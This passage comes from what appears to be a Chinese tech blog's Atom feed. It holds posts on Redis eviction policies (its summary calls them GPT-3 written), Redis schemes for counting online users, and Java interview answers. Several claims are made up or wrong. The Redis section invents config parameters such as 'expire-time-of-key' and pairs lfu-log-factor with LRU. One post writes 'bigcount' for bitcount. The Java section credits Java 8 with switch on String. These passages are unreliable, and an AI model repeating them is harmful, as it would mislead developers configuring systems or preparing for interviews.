策略，以避免数据被频繁淘汰。</p><ol><li>缓存数据的重要性和生命周期</li></ol><p>对于一些重要的数据，可以选择 volatile-ttl 策略，以保证这些数据在过期时间短的情况下不被淘汰。</p><p>需要注意的是，Redis 的内存淘汰策略并不是绝对可靠的，一些特殊情况下可能会导致数据被误淘汰，因此在使用 Redis 缓存时需要做好数据备份和容灾工作。</p><h3 id="Redis-的数据淘汰机制是什么？有哪些配置参数？"><a href="#Redis-的数据淘汰机制是什么？有哪些配置参数？" class="headerlink" title="Redis 的数据淘汰机制是什么？有哪些配置参数？"></a>Redis 的数据淘汰机制是什么？有哪些配置参数？</h3><p>Redis 的数据淘汰机制主要是通过内存淘汰策略来实现的，具体介绍可以参考前面的问题回答。</p><p>除了内存淘汰策略，Redis 还提供了一些配置参数来控制数据的淘汰行为，包括以下几个：</p><ol><li>maxmemory</li></ol><p>该参数用于设置 Redis 实例的最大内存限制，当 Redis 内存超过该限制时，会触发内存淘汰机制。</p><ol><li>maxmemory-policy</li></ol><p>该参数用于设置 Redis 实例的内存淘汰策略，包括 noeviction、allkeys-lru、allkeys-random、volatile-lru、volatile-random、volatile-ttl 六种策略，详细介绍可以参考前面的问题回答。</p><ol><li>maxmemory-samples</li></ol><p>该参数用于设置 Redis 内存淘汰策略中随机采样的键数，默认值为 5，建议根据实际情况进行调整。</p><ol><li>maxmemory-policy 其他配置参数</li></ol><p>对于不同的内存淘汰策略，还可以配置一些特定的参数，如：</p><ul><li>volatile-lru 和 allkeys-lru 策略可以通过 lfu-log-factor 参数来设置 LRU 算法的淘汰因子；</li><li>volatile-ttl 策略可以通过 expire-time-of-key 参数来设置过期时间的加权因子；</li><li>volatile-lfu 策略可以通过 hz 参数来设置 LFU 算法的调用频率。</li></ul><p>需要注意的是，配置 Redis 的内存淘汰机制时需要根据实际的业务需求和数据特点进行调整，以达到最优的效果。同时，在使用 Redis 缓存时，也需要注意数据备份和容灾工作，避免数据的丢失或损坏。</p><h3 id="Redis-和关系型数据库的应用场景有什么不同？"><a href="#Redis-和关系型数据库的应用场景有什么不同？" class="headerlink" title="Redis 和关系型数据库的应用场景有什么不同？"></a>Redis 和关系型数据库的应用场景有什么不同？</h3><p>Redis 和关系型数据库的应用场景有一定的区别，主要体现在以下几个方面：</p><ol><li>数据结构和访问方式</li></ol><p>Redis 作为一种基于内存的数据存储服务，支持多种数据结构，如字符串、哈希、列表、集合和有序集合等。相比之下，关系型数据库主要采用表格形式存储数据，支持 SQL 语言进行数据访问和操作。</p><p>Redis 的数据结构具有高效、灵活的特点，适合处理简单、独立、实时性要求高的数据，如计数器、缓存、会话状态等；而关系型数据库则更适合处理数据之间存在关联关系、需要复杂查询和事务支持的应用场景。</p><ol><li>数据容量和持久化</li></ol><p>Redis 的数据存储和计算都在内存中完成，相比之下，关系型数据库通常采用磁盘存储数据，可以处理大量的数据，但同时也需要更多的硬件资源和时间开销。</p><p>另外，Redis 提供了多种持久化机制来保证数据的可靠性和持久化，而关系型数据库通常也支持事务和日志机制来实现数据的持久化和恢复。</p><ol><li>读写性能和扩展性</li></ol><p>由于 Redis 的数据存储和计算都在内存中完成，具有极高的读写性能和响应速度，特别适合处理高并发、低延迟的应用场景。而关系型数据库在高并发场景下通常需要通过增加硬件资源和优化数据库设计来提升性能。</p><p>另外，Redis 支持集群和主从复制等分布式架构，可以实现数据的高可用和扩展性；而关系型数据库通常需要通过分库分表和负载均衡等手段来实现数据的横向扩展。</p><p>综上所述，Redis 和关系型数据库的应用场景有所不同，需要根据实际的业务需求和数据特点进行选择。通常，可以将 Redis 作为缓存、计数器、排行榜等应用的后端数据存储服务，而将关系型数据库作为处理关联关系、事务等复杂数据逻辑的数据存储服务。</p>]]></content>
    
    
    <summary type="html">gpt3写的，我试试</summary>
    
    
    
    <category term="java" scheme="https://www.fomal.cc/categories/java/"/>
    
    
    <category term="java笔记" scheme="https://www.fomal.cc/tags/java%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>如何处理亿级用户的登录状态查询</title>
    <link href="https://www.fomal.cc/posts/41763455.html"/>
    <id>https://www.fomal.cc/posts/41763455.html</id>
    <published>2023-08-13T12:26:46.087Z</published>
    <updated>2023-06-17T10:43:55.849Z</updated>
    
    <content type="html"><![CDATA[<h2 id="假如系统需要统计一个上亿级别的的用户在线状态"><a href="#假如系统需要统计一个上亿级别的的用户在线状态" class="headerlink" title="假如系统需要统计一个上亿级别的的用户在线状态"></a>假如系统需要统计一个上亿级别的的用户在线状态</h2><h3 id="方案一："><a href="#方案一：" class="headerlink" title="方案一："></a>方案一：</h3><p>在数据库的基础上增加一个缓存，然后把登录状态存到redis里，在redis中去定义set类型的key，主要用来存储记录登录用户的ID。现在我们假设这个key叫login_user，如果用户登录，就往login_user中增加这个用户的id，如果用户登出就把这个key从set中删去，然后再用scard命令来统计set中的用户id的数量。</p><p>（但是这个方法对内存的消耗会有点大）</p><h3 id="方案二："><a href="#方案二：" class="headerlink" title="方案二："></a>方案二：</h3><p>使用redis的bitmap来存储数据，bitmap本身就是为了亿级数据而诞生的，可以使用他的几个命令，如setbit、getbit和bigcount，用户登录可以用setbit命令去设置一个key为login_status的内容，然后将用户id作为一个位移值，将这个值设为1，即状态为1，那么当用户登出的时候，我们可以使用setbit命令将其状态改为0，如果是判断某个用户是否在线，可以使用getbit命令，如果是统计登录用户数量，可以使用bigcount来进行统计</p><p>（此方法优点是快，去重查重效率高，缺点是bitmap的位移值只能是数字，用户id也只能是自增的纯数字id，不适合分布式架构）</p><h2 id="如果是实现热力地图"><a href="#如果是实现热力地图" class="headerlink" title="如果是实现热力地图"></a>如果是实现热力地图</h2><p>则可以使用redis的GEO，使用geoadd、geopos和geohash这些命令</p><p>当然，现在使用es的GEO更省事，如果加上ELK组合，则可以直接生成</p>]]></content>
    
    
    <summary type="html">如何处理亿级用户的登录状态查询</summary>
    
    
    
    <category term="java笔记" scheme="https://www.fomal.cc/categories/java%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="java" scheme="https://www.fomal.cc/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>java面试题</title>
    <link href="https://www.fomal.cc/posts/1491d7b8.html"/>
    <id>https://www.fomal.cc/posts/1491d7b8.html</id>
    <published>2023-08-13T12:26:46.078Z</published>
    <updated>2023-06-26T05:17:00.064Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、java面向对象有哪些特征？"><a href="#一、java面向对象有哪些特征？" class="headerlink" title="一、java面向对象有哪些特征？"></a>一、java面向对象有哪些特征？</h3><p>面向对象三大特征：<strong>封装、继承、多态</strong>。封装说明一个类行为和属性于其他类的关系，低耦合、高内聚；继承是父类和子类的关系；多态说的是类与类的关系；</p><p><strong>封装</strong>隐藏了类的内部实现机制，可以在不影响使用的情况下改变类的内部结构，同时也保护了数据。对于外界，他的内部细节是隐藏的，暴露的只是他的访问方法。<strong>属性的封装：</strong>使用者只能通过事先制定好的方法来访问数据，可以方便加入逻辑控制，限制对属性的不合理操作；<strong>方法的封装</strong>：使用者按照既定的方式调用方法，不必关心方法的内部实现，便于使用，增强代码的可维护性；</p><p><strong>继承</strong>是从已有的类中派生出新的类，新的类的数据属性和行为，并能扩展新的能力。子类继承父类，表示子类是一种特殊的父类，并且具有父类所没有的一些方法和属性。从多种实现类中抽出一个基类，使其具备多种实现类的共同特性，当实现类用extends继承了基类（父类）后，实现类就具备了那些相同的属性。当然，父类中通过private定义的变量和方法不会被继承。</p><p>对于<strong>多态</strong>，我更倾向于分为<strong>静态多态</strong>和<strong>动态多态</strong>，静态多态是指在编译时就已经确定的多态，常见的就是<strong>重载</strong>，重载是指两个或者多个函数具有形同的函数名，但参数列表不同，这样就可以根据参数据的不同来区分不同的参数。动态多态是指在运行时才能确定的多态，常见的就是<strong>重写</strong>，重写就是子类重新定义父类的方法，从而使父类方法可以根据不同的对象而具有不同的表达。</p><h3 id="二、java中有哪几种方式来创建线程执行任务？"><a href="#二、java中有哪几种方式来创建线程执行任务？" class="headerlink" title="二、java中有哪几种方式来创建线程执行任务？"></a>二、java中有哪几种方式来创建线程执行任务？</h3><ol><li><h4 id="继承thread类"><a href="#继承thread类" class="headerlink" title="继承thread类"></a>继承thread类</h4><p>重写run方法，new thread方法跑。但是这样占用了当前类的继承名额，使得当前类不能再继承其他类  </p></li><li><h4 id="实现runnable接口"><a href="#实现runnable接口" class="headerlink" title="实现runnable接口"></a>实现runnable接口</h4><p>实现run方法，使用依然用到thread。这种方法更常用，其实thread类底层也是实现了runnable接口。</p><p>也可以通过匿名内部类的方式去生成一个runnable对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>()&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>又因为runnable是一个函数式接口（只有一个方法），所以也可以用lamda表达式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; System.out.println(<span class="string">&quot;hello world&quot;</span>))</span><br></pre></td></tr></table></figure></li><li><h4 id="实现callable接口"><a href="#实现callable接口" class="headerlink" title="实现callable接口"></a>实现callable接口</h4><p>他去执行任务可以拿到任务结果，不过底层也是Runnable</p><p><em>实现Runnable生成对象 =&gt; 传给FutureTask =&gt; 把FutureTask传给Thread =&gt; 启动线程 =&gt;FutureTask用get()方法阻塞式取得结果</em></p><p><em>顺带一提，FutureTask也是实现了Runnable</em></p></li><li><h4 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h4><p>底层还是Runnable，从某种层面上来说，全是用Runnable来做的</p></li></ol><h3 id="三、为什么不建议使用Executors来创建线程池"><a href="#三、为什么不建议使用Executors来创建线程池" class="headerlink" title="三、为什么不建议使用Executors来创建线程池"></a>三、为什么不建议使用Executors来创建线程池</h3><p>Executors创建线程池底层采用的是无界阻塞队列，当线程数一定但是任务很多时，会将任务不断的塞入队列中，直到耗尽内存导致<strong>OOM</strong>（内存溢出）</p><p>而且Executors也不能自定义线程的名字，不利于监控线程和排查问题。更建议使用<strong>ThreadPoolExecutor</strong>，他可以灵活控制线程</p><h3 id="四、线程池有哪几种状态？分别表示什么？"><a href="#四、线程池有哪几种状态？分别表示什么？" class="headerlink" title="四、线程池有哪几种状态？分别表示什么？"></a>四、线程池有哪几种状态？分别表示什么？</h3><ol><li><h4 id="RUNNING"><a href="#RUNNING" class="headerlink" title="RUNNING"></a>RUNNING</h4><p>表示线程池正常运行，<strong>既能接受新任务，也可以处理队列中的任务</strong></p></li><li><h4 id="SHUTDOWN"><a href="#SHUTDOWN" class="headerlink" title="SHUTDOWN"></a>SHUTDOWN</h4><p>当调用线程池的<strong>shutdown()</strong>方法时，线程池就会进入SHUTDOWN状态。<strong>此时线程池不会接受新的任务，但是会把队列中的任务处理完</strong></p></li><li><h4 id="STOP"><a href="#STOP" class="headerlink" title="STOP"></a>STOP</h4><p>当调用线程池中的<strong>shutdownnow()</strong>方法时，线程池就会进入STOP状态（停止状态），<strong>此状态下，线程池既不会接受新任务，也不会处理队列中的任务，并且正在运行的线程也会直接中断</strong></p></li><li><h4 id="TIDYING"><a href="#TIDYING" class="headerlink" title="TIDYING"></a>TIDYING</h4><p>线程池中没有线程运行后，线程池的状态会自动进入TIDYING，并调用<strong>terminated()</strong>方法，该方法为空方法，可以进行扩展</p></li><li><h4 id="TERMINATED"><a href="#TERMINATED" class="headerlink" title="TERMINATED"></a>TERMINATED</h4><p>terminated()方法执行完后，状态也成了TERMINATED</p></li></ol><h3 id="五、Sychronized和ReentrantLock有哪些不同？"><a href="#五、Sychronized和ReentrantLock有哪些不同？" class="headerlink" title="五、Sychronized和ReentrantLock有哪些不同？"></a>五、Sychronized和ReentrantLock有哪些不同？</h3><div class="table-container"><table><thead><tr><th style="text-align:center">sychronized</th><th style="text-align:center">ReentrantLock</th></tr></thead><tbody><tr><td style="text-align:center">java中的关键字</td><td style="text-align:center">JDK提供的一个类</td></tr><tr><td style="text-align:center">自动加锁与释放锁</td><td style="text-align:center">需手动加锁与释放锁</td></tr><tr><td style="text-align:center">JVM层面的锁</td><td style="text-align:center">API层面的锁</td></tr><tr><td style="text-align:center">锁的是对象，信息保存在对象头中</td><td style="text-align:center">int类型的state标识标识锁的状态</td></tr><tr><td style="text-align:center">底层有锁升级过程</td><td style="text-align:center">无锁升级过程</td></tr><tr><td style="text-align:center">非公平锁</td><td style="text-align:center">非公平锁或公平锁</td></tr></tbody></table></div><h3 id="六、ThreadLocal有哪些场景？底层是如何实现的？"><a href="#六、ThreadLocal有哪些场景？底层是如何实现的？" class="headerlink" title="六、ThreadLocal有哪些场景？底层是如何实现的？"></a>六、ThreadLocal有哪些场景？底层是如何实现的？</h3><ol><li>ThreadLocal是java中提出的线程本地储存机制，可以利用该机制<strong>将数据缓存在某个线程内</strong>，该线程可随时采用任意方法获取缓存的线程</li><li>ThreadLocal底层通过ThreadLocalMap来实现的，每个<strong>Thread对象</strong>（不是ThreadLocal对象）都存在一个ThreadLocalMap中，Map的key是ThreadLocal对象，value是需要缓存的值</li><li>特别注意，如果在线程池中使用ThreadLocal会导致<strong>内存泄漏</strong>，因为当ThreadLocal对象使用完后，应把设置的key、value即Entry对象回收，但线程池中的线程没有回收，且线程对象是通过强引用指向ThreadLocalMap，而ThreadLocalMap也是通过强引用指向Entry对象。线程没有回收就代表Entry对象没有回收，从而导致内存泄漏。<strong>解决方法：</strong>在使用了ThreadLocal对象之后，手动调用ThreadLocal的remove()方法手动消除Entry对象</li><li>TreadLocal常用于连接管理，不太常用</li></ol><h3 id="七、ReentrantLock分为公平锁和非公平锁，底层是如何实现的？"><a href="#七、ReentrantLock分为公平锁和非公平锁，底层是如何实现的？" class="headerlink" title="七、ReentrantLock分为公平锁和非公平锁，底层是如何实现的？"></a>七、ReentrantLock分为公平锁和非公平锁，底层是如何实现的？</h3><p>首先，无论公平锁还是非公平锁，他们的底层都是使用AQS来进行排队，他们的区别在于线程使用lock()方法加锁时</p><ol><li>如果是公平锁，会先检车AQS队列中是否存在线程在排队，如果有就也进行排队</li><li>如果是非公平锁，则不会检查是否有线程排队，而是直接去竞争</li></ol><p>此外，无论是非公平锁还是公平锁，一旦没拿到锁，都会进行排队，当释放锁时，都是唤醒最前面的线程。所以非公平锁只是体现在线程加锁阶段，而没有体现在唤醒阶段。<strong>ReentrantLock也是可重入锁，不论是公平还是非公平，都是可重入锁</strong>（即同一个线程可连续重复加同一把锁）</p><h3 id="八、Sychronized的锁升级过程"><a href="#八、Sychronized的锁升级过程" class="headerlink" title="八、Sychronized的锁升级过程"></a>八、Sychronized的锁升级过程</h3><ol><li><strong>偏向锁：</strong>在锁对象的对象头中记录下当前获取到该锁的线程ID，该线程下次如果又来获取，该锁就可以直接被获取，也就是支持锁重入</li><li><strong>轻量级锁：</strong>由偏向锁升级而来，当一个线程获取到锁后，此时这把锁就是偏向锁。但是此时如果有第二把锁来竞争，偏向锁就会升级为轻量级锁。之所以叫轻量级锁，就是为了和重量级锁区分开来。轻量级锁的底层是通过自旋来实现的，不会阻塞线程</li><li>如果自旋次数过多却仍然没获得锁，则会升级为重量级锁，重量级锁会导致线程阻塞</li><li><strong>自旋锁：</strong>当一个线程尝试获取某个锁时，如果该锁被其他线程占用，就一直循环检测锁是否被释放，而不是进入线程挂起或者睡眠状态。具体就是通过CAS获取预期的一个标记，如果没有获取到，则继续循环获取。如果获取到了，则表示获取到这个锁。<strong>自旋锁不会阻塞线程</strong></li></ol><h3 id="九、字节流与字符流的区别"><a href="#九、字节流与字符流的区别" class="headerlink" title="九、字节流与字符流的区别"></a>九、字节流与字符流的区别</h3><p>字节流和字符流是Java I/O中的两种基本的数据流，它们之间的主要区别在于处理数据的单位不同。</p><p>字节流以字节为单位读写数据，它可以读写任何类型的数据，包括二进制数据和文本数据。字节流的输入输出对象是InputStream和OutputStream，常用的子类有FileInputStream和FileOutputStream。</p><p>字符流以字符为单位读写数据，它只能读写文本数据，不能读写二进制数据。字符流的输入输出对象是Reader和Writer，常用的子类有FileReader和FileWriter。</p><p>在Java中，字符流和字节流是通过InputStreamReader和OutputStreamWriter相互转换的。InputStreamReader可以将字节流转换为字符流，而OutputStreamWriter可以将字符流转换为字节流。这样就可以在字符流和字节流之间进行转换，以满足不同的应用需求。</p><h3 id="十、JDK、JRE、JVM之间的区别"><a href="#十、JDK、JRE、JVM之间的区别" class="headerlink" title="十、JDK、JRE、JVM之间的区别"></a>十、JDK、JRE、JVM之间的区别</h3><ol><li>JDK是JAVA标准开发包，提供了编译运行java程序所需的各种工具（比如编译器javac）和资源</li><li>JRE是java运行环境，用于运行java字节码文件（.class），JRE包括JVM和JVM工作所需类库。普通用户只需要安装JRE跑程序，开发者则需要JDK来编译调试</li><li>JVM是java虚拟机，JRE的一部分，是整个java实现跨平台的关键，负责运行字节码文件</li></ol><h3 id="十一、String、StringBuffer、StringBuild的区别"><a href="#十一、String、StringBuffer、StringBuild的区别" class="headerlink" title="十一、String、StringBuffer、StringBuild的区别"></a>十一、String、StringBuffer、StringBuild的区别</h3><p><strong>string</strong>是常量，不可变，如果尝试修改string，会新生成一个字符串对象。<strong>stringbuffer</strong>和<strong>stringbuilder</strong>可修改，但是stringbuffer是线程安全的，stringbuilder线程不安全，底层没有锁机制，但是速度相对更快</p><h3 id="十二、泛型中extends和super的区别"><a href="#十二、泛型中extends和super的区别" class="headerlink" title="十二、泛型中extends和super的区别"></a>十二、泛型中extends和super的区别</h3><ol><li><strong>&lt;? extends T&gt;</strong> 表示包括T在内的任何T的子类</li><li><strong>&lt;? super T&gt;</strong> 表示包括T在内的任何T的父类</li></ol><h3 id="十三、-和equals方法的区别"><a href="#十三、-和equals方法的区别" class="headerlink" title="十三、 ==和equals方法的区别"></a>十三、 ==和equals方法的区别</h3><ol><li><strong>==：</strong>如果是基本数据类型，比较的是值；如果是引用类型，比较的是引用地址</li><li><strong>equals：</strong>一般情况下和==没区别，他的底层就是==。但是在一些类中被重写了，比如string，虽然是引用类，但是比较的却是每个字符是否相等</li></ol><h3 id="十四、重载和重写的区别"><a href="#十四、重载和重写的区别" class="headerlink" title="十四、重载和重写的区别"></a>十四、重载和重写的区别</h3><ol><li><strong>重载：</strong>发生在同一个类中，方法名必须相同，参数类型不同、参数个数不同、顺序不同，方法返回值和访问修饰符可以不同，发生于编译时</li><li><strong>重写：</strong>发生于父子类中，方法名和参数必须相同，返回值范围不可大于父类，抛出异常的范围不可大于父类，访问修饰符范围大于或等于父类。若父类中该方法被private修饰，则不可被重写</li></ol><h3 id="十五、Set和List的区别"><a href="#十五、Set和List的区别" class="headerlink" title="十五、Set和List的区别"></a>十五、Set和List的区别</h3><ol><li><strong>List：</strong>有序，按对象进入的顺序保存对象，可重复，允许多个null元素对象，可以用迭代器进行遍历，也可以用get(index)来获取指定下标的元素</li><li><strong>Set：</strong>无序，不可重复，最多允许一个null元素对象。只可以用迭代器（Iterator）遍历</li></ol><h3 id="十六、-ArrayList和LinkList的区别"><a href="#十六、-ArrayList和LinkList的区别" class="headerlink" title="十六、 ArrayList和LinkList的区别"></a>十六、 ArrayList和LinkList的区别</h3><ol><li>首先底层结构不同，ArrayList采用数组实现，而linkedList采用链表来实现</li><li>因此，他们的应用场景不同，ArrayList更适合随机查找，linkedList更适合删除和添加</li><li>此外，虽然ArrayList和Linkedlist都实现了List接口，但是Linkedlist还额外实现了Deque接口，所以Linkedlist也可以当队列来使用</li></ol><h3 id="十七、谈谈ConcurrentHashMap的扩容机制"><a href="#十七、谈谈ConcurrentHashMap的扩容机制" class="headerlink" title="十七、谈谈ConcurrentHashMap的扩容机制"></a>十七、谈谈ConcurrentHashMap的扩容机制</h3><p>这个得分开来谈：</p><p>jdK1.7：</p><ol><li>基于segment对象分段实现</li><li>每个segment对象相当于一个小型的HashMap</li><li>每个segment对象内部会进行扩容，与HashMap类似</li><li>先生成新的数组，然后转移元素去新的数组</li></ol><p>jdk1.8：</p><ol><li>不再基于segment</li><li>当某个线程put时，如果发现concurrentHashMap在扩容，则一起扩容</li><li>如果线程put而concurrentHashMap没有扩容。则将key-value添加到concurrentHashMap中，判断是否超出阈值，超出则扩容</li><li>concurrentHashMap支持多线程同时扩容</li><li>扩容前也新生成一个数组，转移元素时，先将原数组分组，将每组分给不同线程来进行元素转移，每个线程负责一组或者多组元素的转移</li></ol><h3 id="十八、JDK1-7与JDK1-8的区别（详细描述HashMap的变化）"><a href="#十八、JDK1-7与JDK1-8的区别（详细描述HashMap的变化）" class="headerlink" title="十八、JDK1.7与JDK1.8的区别（详细描述HashMap的变化）"></a>十八、JDK1.7与JDK1.8的区别（详细描述HashMap的变化）</h3><ol><li>1.8的接口可以有static方法实现和default方法实现</li><li>JVM元空间替换永久代</li><li>lambda表达式</li><li>新增stream流</li><li>函数式接口</li><li>日期API和并发API</li><li>Switch支持string类型</li><li>HashMap底层变化：<ol><li>JDK1.7中底层为数组+链表，1.8中是数组+链表+红黑树，红黑树的加入提高了HashMap的插入和查询的整体效率</li><li>JDK1.7中链表使用头插法，JDK1.8中使用尾插法。因为JDK1.8中插入key-value时需要判断链表元素个数，所以需要遍历链表元素个数，所以正好采用尾插法</li><li>JDK1.7中哈希算法比较复杂，存在各种右移和异或运算，由于JDK1.8中引入了红黑树，所以对其做了适当简化，节省CPU资源</li></ol></li></ol><h3 id="十九、HashMap的put方法"><a href="#十九、HashMap的put方法" class="headerlink" title="十九、HashMap的put方法"></a>十九、HashMap的put方法</h3><p>先说说HashMap的Put方法的大体流程：</p><ol><li>根据key通过哈希算法运算得出数组下标</li><li>若数组下表位置为空，则将key-value封装为Entry对象（JDK1.7为Entry对象，JDK1.8为Node对象）并放入该位置</li><li>若不为空，则分开讨论：<ol><li>若为JDK1.7，则判断是否需要扩容，若不用扩容则生成Entry对象，并用头插法添加到当前位置的链表中</li><li>若为JDK1.8，则先判断当前位置上的Node类型，看是链表Node还是红黑树Node：<ol><li>如果是红黑树Node，则将key-value封装为一个红黑树节点并添加到红黑树中去，这个过程会判断红黑树中是否存在当前key，存在则更新value</li><li>如果是链表Node，则将key-value封装为Node插入链表最后，因为采用尾插法，所以需要遍历链表，在遍历链表时会判断key是否存在于当前链表中，存在则更新value，遍历完之后，将新链表Node插入到链表中，插入后会看当前链表的节点个数，大于等于8则将该链表转为红黑树</li><li>将key和value封装为Node插入红黑树或者链表中后，再判断是否扩容，需要就扩容。否则就结束Put方法</li></ol></li></ol></li></ol><h3 id="二十、深拷贝和浅拷贝"><a href="#二十、深拷贝和浅拷贝" class="headerlink" title="二十、深拷贝和浅拷贝"></a>二十、深拷贝和浅拷贝</h3><p>深拷贝和浅拷贝就是指对象的拷贝，一个对象中存在两种类型的属性，一种是基本数据类型，另一种是实例对象引用。</p><ol><li>浅拷贝是指只会拷贝基本数据类型的值，以及实例对象的引用地址，并不会复制一份引用对象地址所以指向的对象，也就是浅拷贝出来的对象内部的类属性指向的是同一个对象</li><li>深拷贝是指既会拷贝基本数据类型的值，也会针对实例对象的引用地址所指向的对象进行复制，深拷贝出来的对象，内部的属性指向的不是同一个对象</li></ol><h3 id="二十一、HashMap的扩容机制原理"><a href="#二十一、HashMap的扩容机制原理" class="headerlink" title="二十一、HashMap的扩容机制原理"></a>二十一、HashMap的扩容机制原理</h3><p>JDK1.7</p><ol><li>先生成数组</li><li>遍历老数组中的每个位置上的链表上的每个元素</li><li>取每个元素key，并基于新的数组长度，计算出每个元素在新数组中的下标</li><li>将元素添加到数组中去</li><li>所有元素转移完后，将新数组赋值给HashMap对象的table属性</li></ol><p>JDK1.8</p><ol><li>先生成新数组</li><li>遍历老数组中的每个位置上的链表或红黑树</li><li>如果是链表，则将链表中每个元素重新计算下标，并添加到新数组中去</li><li>如果是红黑树，则先遍历红黑树，先计算红黑树中每个元素对应新数组中的下标：<ol><li>统计每个下标位置元素个数</li><li>如果该下标的元素个数超过8，则生成新的红黑树，并将根节点添加到新数组对应位置</li><li>如果不超过8，则生成一个链表，并将其头节点添加到新数组的对应位置</li></ol></li><li>所有元素转移完成后，将新数组赋值给HashMap对象table属性</li></ol><h3 id="二十二、CopyOnWriteArrayList的底层原理"><a href="#二十二、CopyOnWriteArrayList的底层原理" class="headerlink" title="二十二、CopyOnWriteArrayList的底层原理"></a>二十二、CopyOnWriteArrayList的底层原理</h3><ol><li>首先CopyOnWriteArrayList内部也是通过数组来实现的，在向CopyOnWriteArrayList添加元素时，会复制一个新的数组，写操作在新数组上进行，读操作在原数组上进行</li><li>且写操作会加锁，防止出现并发写入丢失数据的问题</li><li>写操作结束之后会把原数组指定新数组</li><li>CopyOnWriteArrayList允许在写操作时来读取数据，极大的提高了读的性能，因此适合读多写少的场景，但是其比较占内存，同时可额能读到的数据不是实时数据，所以不适合实时性要求高的场景</li></ol><h3 id="二十三、为什么要实现序列化？如何实现序列化？"><a href="#二十三、为什么要实现序列化？如何实现序列化？" class="headerlink" title="二十三、为什么要实现序列化？如何实现序列化？"></a>二十三、为什么要实现序列化？如何实现序列化？</h3><ol><li>序列化：指把堆内存中的java对象数据，通过某种方式把对象存储到磁盘文件中或者传递给其他网络节点（在网络上传输），这个过程就是序列化。通俗来说就是将数据结构或者对象转换成二进制数据流的过程</li><li>反序列化：把磁盘文件中的数据对象或者把网络节点上的对象数据恢复成java对象模型的过程。也就是将在序列化过程中产生的二进制数据流转换成对象</li><li></li></ol><h3 id="二十四、java的异常体系"><a href="#二十四、java的异常体系" class="headerlink" title="二十四、java的异常体系"></a>二十四、java的异常体系</h3><ol><li>Java中所有异常都来自顶级父类Throwable</li><li>Throwable下面有两个子类Exception和Error</li><li>Error表示非常严重的错误，比如StackOverFlowError和OutOfMemoryError，通常这些错误出现时，仅仅想靠程序自己是解决不了的，可能是虚拟机、磁盘或者操作系统出了问题，这类异常不要去捕获。出现Exception则表示可以依靠程序解决，如NullPointException</li><li>Exception子类又分为RuntimeException和非RuntimeException</li><li>RuntimeException表示运行异常，是代码在运行中抛出的异常，一般由逻辑错误引起，应尽可能避免，常见如NullPointException</li><li>非RuntimeException表示非运行异常，常在编写代码时碰到，程序无法通过异常检测，如IOException</li></ol><h3 id="二十五、什么时候抛出异常？什么时候捕获异常？"><a href="#二十五、什么时候抛出异常？什么时候捕获异常？" class="headerlink" title="二十五、什么时候抛出异常？什么时候捕获异常？"></a>二十五、什么时候抛出异常？什么时候捕获异常？</h3><p>异常相当于一种提示，如果抛出异常，相当于告诉上层方法，“我抛了一个异常，我处理不了这个异常，交给你处理”，但是上层方法未必能解决异常，他可能也需要抛给更上层。</p><p>所以我们在写一个方法时，我们需要考虑的是本方法怎么合理处理异常，如果无法处理就上抛。一般在项目中，我个人倾向于在service层抛出异常，在controller层捕获异常</p><h3 id="二十六、Java中有哪些类加载器"><a href="#二十六、Java中有哪些类加载器" class="headerlink" title="二十六、Java中有哪些类加载器"></a>二十六、Java中有哪些类加载器</h3><p>JDK自带三个类加载器：bootstrap ClassLoader、ExtClassLoader、APPClassLoader</p><ol><li>bootstrap ClassLoader是ExtClassLoader的父加载器，默认负责加载%JAVA_HOME%lib下的jar包和class文件</li><li>ExtClassLoader是APPClassLoader的父类加载器，负责加载%JAVA_HOME%lib/ext文件夹下的jar包和class类</li><li>APPClassLoader是自定义类加载器的父类，负责加载classpath下的类文件</li></ol><h3 id="二十七、负载均衡的策略"><a href="#二十七、负载均衡的策略" class="headerlink" title="二十七、负载均衡的策略"></a>二十七、负载均衡的策略</h3><ol><li><strong>轮询：</strong>最基本的配置方法也是默认方法，每个请求会按时间顺序逐一分配到不同的后端服务器。<ol><li>在轮询中服务器down了，会自动剔除该服务器</li><li>缺省配置就是轮询策略</li><li>此策略适合服务器配置相当，无状态且短平快的服务使用</li></ol></li><li><strong>权重：</strong>在轮询策略的基础上指定轮询的几率<ol><li>权重越高分配到需求处理的请求越多</li><li>此策略可以和least_conn和ip_hash结合使用</li><li>此策略比较适合服务器差别比较大的情况</li></ol></li><li><strong>根据ip分配：</strong>指定负载均衡器按照客户端ip的分配方式，这个方法确保了相同的客户端请求一直发送到相同的服务器，以保证session会话。这样每个访客都固定访问一个后端服务器，可以解决session不能跨服务器的问题<ol><li>在nignx 